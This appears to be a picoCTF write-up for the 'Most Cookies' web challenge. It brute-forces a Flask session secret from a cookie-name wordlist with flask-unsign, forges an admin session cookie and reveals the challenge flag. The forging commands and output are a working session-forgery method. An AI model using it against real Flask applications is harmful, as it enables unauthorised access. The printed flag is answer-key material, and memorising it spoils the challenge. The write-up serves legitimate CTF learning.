# **_Most Cookies_**
## Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! `server.py` `http://mercury.picoctf.net:35697/`
## Solution
Anaylse `server.py`, notice that it is looking for a `very_auth` cookie with the value `admin`,
```py
@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```
At the begining of the python code, the webserver randomly chooses a value from the `cookies_name` list as the secert key
```py
app.secret_key = random.choice(cookie_names)
```
When we vist the webserver, we get a cookie `session`, which is a `Flask-session-cookie`
Instead of encrypt, `Secret key` is used to sign the cookie, lets bruteforce the secert key with `flask-unsign`
Make a wordlist with the `cookie_names` list
```console
❯ cat secrets.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
Get the initial session cookie value from the webserver and bruteforce it with the wordlist
```console 
❯ flask-unsign -u -c "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YtCy0A.FI_Yr4OF0Nx63T-LLXm1Kn2adwY" -w secrets.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```
Sign `{'very_auth':'admin'}` with secret key `peanut butter`
```console
❯ flask-unsign -s -S "peanut butter" -c "{'very_auth':'admin'}"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YtC0jg._pPEAwvXYQ0g9wDwnATJV0-i26A
```
Go to `http://mercury.picoctf.net:35697/ ` and change `session` cookie value to the signed flask cookie, refresh the page to get the flag
>picoCTF{pwn_4ll_th3_cook1E5_22fe0842}


